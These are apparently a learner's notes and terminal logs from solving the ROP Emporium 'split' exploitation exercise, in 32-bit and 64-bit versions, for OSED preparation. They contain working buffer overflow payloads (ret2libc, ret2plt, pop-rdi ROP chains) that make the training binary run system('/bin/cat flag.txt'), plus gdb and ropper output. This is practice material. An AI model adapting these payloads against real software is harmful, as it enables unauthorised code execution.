
python2 -c "print('A' * 44 + '\x1a\x86\x04\x08' + '\x30\xa0\x04\x08')" | ./split32 (not returning to libc/plt but returning to a part of a function which calls system)

python2 -c "print('A' * 44 + '\x00\xdd\xdf\xf7' + 'AAAA' + '\x30\xa0\x04\x08')" | ./split32 (ret2libc make sure disable aslr)

python2 -c "print('A' * 44 + '\xe0\x83\x04\x08' + 'AAAA' + '\x30\xa0\x04\x08')" | ./split32 (ret2plt no need disable aslr :))

┌──(george93㉿kali)-[~/…/break/osed-prep/ROPEmporium/split]
└─$ gdb-pwndbg split32
Reading symbols from split32...
(No debugging symbols found in split32)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> x system
0x80483e0 <system@plt>:	0xa01825ff
pwndbg> r
Starting program: /home/george93/Desktop/break/osed-prep/ROPEmporium/split/split32 
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> ^C
Program received signal SIGINT, Interrupt.
0xf7fc9559 in __kernel_vsyscall ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────
 EAX  0xfffffe00
 EBX  0x0
 ECX  0xffffcde0 ◂— 0x0
 EDX  0x60
 EDI  0x8048430 (_start) ◂— xor    ebp, ebp
 ESI  0xf7fa4000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0xffffce08 —▸ 0xffffce18 ◂— 0x0
 ESP  0xffffcda0 —▸ 0xffffce08 —▸ 0xffffce18 ◂— 0x0
 EIP  0xf7fc9559 (__kernel_vsyscall+9) ◂— pop    ebp
────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────
 ► 0xf7fc9559 <__kernel_vsyscall+9>     pop    ebp
   0xf7fc955a <__kernel_vsyscall+10>    pop    edx
   0xf7fc955b <__kernel_vsyscall+11>    pop    ecx
   0xf7fc955c <__kernel_vsyscall+12>    ret    
    ↓
   0xf7eaacc3 <read+51>                 cmp    eax, 0xfffff000
   0xf7eaacc8 <read+56>                 ja     read+144                    <read+144>
    ↓
   0xf7eaad20 <read+144>                mov    edx, dword ptr [esi - 0x110]
   0xf7eaad26 <read+150>                neg    eax
   0xf7eaad28 <read+152>                mov    dword ptr gs:[edx], eax
   0xf7eaad2b <read+155>                mov    eax, 0xffffffff
   0xf7eaad30 <read+160>                jmp    read+58                    <read+58>
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcda0 —▸ 0xffffce08 —▸ 0xffffce18 ◂— 0x0
01:0004│     0xffffcda4 ◂— 0x60 /* '`' */
02:0008│     0xffffcda8 —▸ 0xffffcde0 ◂— 0x0
03:000c│     0xffffcdac —▸ 0xf7eaacc3 (read+51) —▸ 0xfff0003d ◂— 0xfff0003d
04:0010│     0xffffcdb0 —▸ 0xffffce08 —▸ 0xffffce18 ◂— 0x0
05:0014│     0xffffcdb4 —▸ 0xf7fe1ce0 (_dl_runtime_resolve+16) ◂— pop    edx
06:0018│     0xffffcdb8 ◂— 0xffffffff
07:001c│     0xffffcdbc —▸ 0xf7eaac90 (read) ◂— push   edi
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► f 0 0xf7fc9559 __kernel_vsyscall+9
   f 1 0xf7eaacc3 read+51
   f 2 0x80485f6 pwnme+73
   f 3 0x8048590 main+74
   f 4 0xf7dd7905 __libc_start_main+229
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x system
0xf7dfdd00 <__libc_system>:	0x100468e8
pwndbg> 






















┌──(george93㉿kali)-[~/…/break/osed-prep/ROPEmporium/split]
└─$ ropper -f split --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 

                                                                                                            
┌──(george93㉿kali)-[~/…/break/osed-prep/ROPEmporium/split]
└─$ python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x4b\x07\x40\x00\x00\x00\x00\x00')" | ./split (function)

difference between 64bit and 32bit architecture: system grabs arguments off rdi

python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\xd8\xe1\xf7\xff\x7f\x00\x00')" | ./split (libc)

python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x60\x05\x40\x00\x00\x00\x00\x00')" | ./split (plt)


┌──(george93㉿kali)-[~/…/break/osed-prep/ROPEmporium/split]
└─$ ropper -f split --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 

                                                                                                            
┌──(george93㉿kali)-[~/…/break/osed-prep/ROPEmporium/split]
└─$ python2 -c "print('A' * 40 + '\xc3\x07\x40\x00\x00\x00\x00\x00' + '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x4b\x07\x40\x00\x00\x00\x00\x00')" | ./split    
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
zsh: done                python2 -c  | 
zsh: segmentation fault  ./split
                                                                                                            
┌──(george93㉿kali)-[~/…/break/osed-prep/ROPEmporium/split]
└─$ gdb-pwndbg split  
Reading symbols from split...
(No debugging symbols found in split)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret    
End of assembler dump.
pwndbg> search "/bin/cat"
search: The program is not being run.
pwndbg> r
Starting program: /home/george93/Desktop/break/osed-prep/ROPEmporium/split/split 
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7ec255e in __GI___libc_read (fd=0, buf=0x7fffffffdc10, nbytes=96) at ../sysdeps/unix/sysv/linux/read.c:26
26	../sysdeps/unix/sysv/linux/read.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x400760 (__libc_csu_init) ◂— push   r15
 RCX  0x7ffff7ec255e (read+14) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x60
 RDI  0x0
 RSI  0x7fffffffdc10 ◂— 0x0
 R8   0x2c
 R9   0x7ffff7fdc1f0 (_dl_fini) ◂— push   rbp
 R10  0xfffffffffffffb87
 R11  0x246
 R12  0x4005b0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdc30 —▸ 0x7fffffffdc40 ◂— 0x0
 RSP  0x7fffffffdc08 —▸ 0x400735 (pwnme+77) ◂— mov    edi, 0x40083f
 RIP  0x7ffff7ec255e (read+14) ◂— cmp    rax, -0x1000 /* 'H=' */
─────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────
 ► 0x7ffff7ec255e <read+14>     cmp    rax, -0x1000
   0x7ffff7ec2564 <read+20>     ja     read+112                <read+112>
    ↓
   0x7ffff7ec25c0 <read+112>    mov    rdx, qword ptr [rip + 0xdf889]
   0x7ffff7ec25c7 <read+119>    neg    eax
   0x7ffff7ec25c9 <read+121>    mov    dword ptr fs:[rdx], eax
   0x7ffff7ec25cc <read+124>    mov    rax, -1
   0x7ffff7ec25d3 <read+131>    ret    
 
   0x7ffff7ec25d4 <read+132>    nop    dword ptr [rax]
   0x7ffff7ec25d8 <read+136>    mov    rdx, qword ptr [rip + 0xdf871]
   0x7ffff7ec25df <read+143>    neg    eax
   0x7ffff7ec25e1 <read+145>    mov    dword ptr fs:[rdx], eax
─────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc08 —▸ 0x400735 (pwnme+77) ◂— mov    edi, 0x40083f
01:0008│ rsi 0x7fffffffdc10 ◂— 0x0
... ↓        3 skipped
05:0028│ rbp 0x7fffffffdc30 —▸ 0x7fffffffdc40 ◂— 0x0
06:0030│     0x7fffffffdc38 —▸ 0x4006d7 (main+64) ◂— mov    edi, 0x400806
07:0038│     0x7fffffffdc40 ◂— 0x0
───────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────
 ► f 0   0x7ffff7ec255e read+14
   f 1         0x400735 pwnme+77
   f 2         0x4006d7 main+64
   f 3   0x7ffff7dfb7fd __libc_start_main+205
────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> search "/bin/cat"
split           0x601060 '/bin/cat flag.txt'
pwndbg> 

